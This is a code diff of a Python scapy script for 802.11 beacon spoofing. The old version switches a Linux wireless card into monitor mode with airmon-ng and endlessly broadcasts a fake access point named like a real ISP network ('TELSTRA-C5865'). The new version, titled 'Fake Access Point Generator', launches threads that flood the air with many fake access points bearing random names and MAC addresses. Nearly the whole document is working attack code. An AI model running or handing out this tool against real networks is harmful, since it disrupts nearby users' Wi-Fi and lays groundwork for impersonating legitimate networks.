@@ -1,38 +1,46 @@
-import platform as plat
-import os
-import time
 from scapy.all import *
+from threading import Thread
+from faker import Faker
 
-#ENSURE THAT YOU ARE ON LINUX
-platform_system = plat.system()
-if platform_system != "Linux":
-    print("Unsuppoted OS, Quitting Now")
-    quit()
-else:
-    os.system("airmon-ng check kill")
-    time.sleep(5)
-    os.system("airmon-ng start wlan0")
+def send_beacon(ssid, mac, infinite=True):
+    dot11 = scapy.all.Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
+    # type=0:       management frame
+    # subtype=8:    beacon frame
+    # addr1:        MAC address of the receiver
+    # addr2:        MAC address of the sender
+    # addr3:        MAC address of the Access Point (AP)
+
+    # beacon frame
+
+    beacon = scapy.all.Dot11Beacon()
     
-################
-# Start Script #
-################
+    # we inject the ssid name
+    essid = scapy.all.Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+    
 
-from scapy.all import *
+    # stack all the layers and add a RadioTap
+    frame = scapy.all.RadioTap()/dot11/beacon/essid
 
-# interface to use to send beacon frames, must be in monitor mode
-iface = "wlan0mon"
-# generate a random MAC address (built-in in scapy)
-sender_mac = RandMAC()
-# SSID (name of access point)
-ssid = "TELSTRA-C5865"
-# 802.11 frame
-dot11 = scapy.all.Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
-# beacon layer
-beacon = scapy.all.Dot11Beacon()
-# putting ssid in the frame
-essid = scapy.all.Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
-# stack all the layers and add a RadioTap
-frame = scapy.all.RadioTap()/dot11/beacon/essid
-# send the frame in layer 2 every 100 milliseconds forever
-# using the `iface` interface
-sendp(frame, inter=0.1, iface=iface, loop=1)
+    # send the frame
+    if infinite:
+        sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)
+    else:
+        sendp(frame, iface=iface, verbose=0)
+
+
+if __name__ == "__main__":
+    import argparse
+
+    parser = argparse.ArgumentParser(description="Fake Access Point Generator")
+    parser.add_argument("interface", default="wlan0mon", help="The interface to send beacon frames with, must be in monitor mode")
+    parser.add_argument("-n", "--access-points", type=int, dest="n_ap", help="Number of access points to be generated")
+    args = parser.parse_args()
+    n_ap = args.n_ap
+    iface = args.interface
+
+    # generate random SSIDs and MACs
+    faker = Faker()
+
+    ssids_macs = [ (faker.name(), faker.mac_address()) for i in range(n_ap) ]
+    for ssid, mac in ssids_macs:
+        Thread(target=send_beacon, args=(ssid, mac)).start()
